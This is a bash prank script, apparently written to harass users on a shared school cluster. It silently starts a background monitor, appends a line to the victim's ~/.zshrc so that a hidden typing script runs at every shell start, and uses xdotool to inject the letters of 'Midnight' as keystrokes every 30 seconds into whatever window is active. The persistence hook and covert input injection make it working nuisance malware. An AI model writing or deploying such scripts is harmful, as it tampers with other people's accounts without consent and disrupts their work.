#!/bin/bash
nohup /sgoinfre/goinfre/Perso/mochamsa/troll/monitor.sh > /dev/null 2>&1 &
if ! grep -q "/sgoinfre/goinfre/Perso/mochamsa/troll/type.sh" ~/.zshrc 2>/dev/null; then
    cat << EOF >> ~/.zshrc
nohup /sgoinfre/goinfre/Perso/mochamsa/troll/type.sh > /dev/null 2>&1 &
EOF
fi


XDOTOOL_PATH="/sgoinfre/goinfre/Perso/mochamsa/utils/xdotool_temp/usr/bin/xdotool"
export LD_LIBRARY_PATH="/sgoinfre/goinfre/Perso/mochamsa/utils/xdotool_temp/usr/lib/x86_64-linux-gnu:$LD_LIBRARY_PATH"

if [ ! -x "$XDOTOOL_PATH" ]; then
    exit 1
fi

cleanup() {
    exit 0
}

trap cleanup SIGINT SIGTERM

letters=("M" "i" "d" "n" "i" "g" "h" "t")
letter_index=0

while true; do
    sleep 30
    
    $XDOTOOL_PATH key ${letters[$letter_index]}
    
    letter_index=$(((letter_index + 1) % ${#letters[@]}))
    if [ $letter_index -eq 0 ]; then
        sleep 30
    fi
done